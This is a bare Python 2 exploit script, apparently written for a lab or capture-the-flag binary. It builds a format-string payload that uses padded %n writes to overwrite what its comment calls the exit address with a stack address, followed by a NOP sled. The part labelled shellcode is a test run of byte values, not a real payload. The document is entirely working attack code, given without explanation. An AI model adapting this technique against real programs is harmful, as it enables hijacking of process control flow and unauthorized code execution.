#!/usr/bin/python2
# exit addr: 0x804c014

nopsled = '\x90' * 95

buf = ''
for i in range(1,256):
    if i not in (9, 10, 13, 32):
	buf += chr(i)

shellcode = nopsled + buf

addr1 = "\x14\xc0\x04\x08"
addr2 = "\x15\xc0\x04\x08"
addr3 = "\x16\xc0\x04\x08"
addr4 = "\x17\xc0\x04\x08"

# shellcode addr: 0xffffc8f0
t1 = 0xf0
t2 = 0xc8
t3 = 0xff
t4 = 0xff
#print addr1 + addr2 + addr3 + addr4 + "%x%x%x%n%n%n%n"

p1 = (t1 + 256 - 0x2a) * "."
p2 = (t2 + 256*2 - 0x2a - len(p1) ) * "." # 256 * 2 is to compensate p1 lenth which is already summed with 256
p3 = (t3 + 256*3 - 0x2a - len(p1) - len(p2) ) * "."
p4 = (t4 + 256*4 - 0x2a - len(p1) - len(p2) - len(p3)) * "."
exploit = addr1 + addr2 + addr3 + addr4 + "%x.%x.%x." + p1 + "%n" + p2 + "%n" + p3 + "%n" + p4 + "%n"
print exploit + shellcode



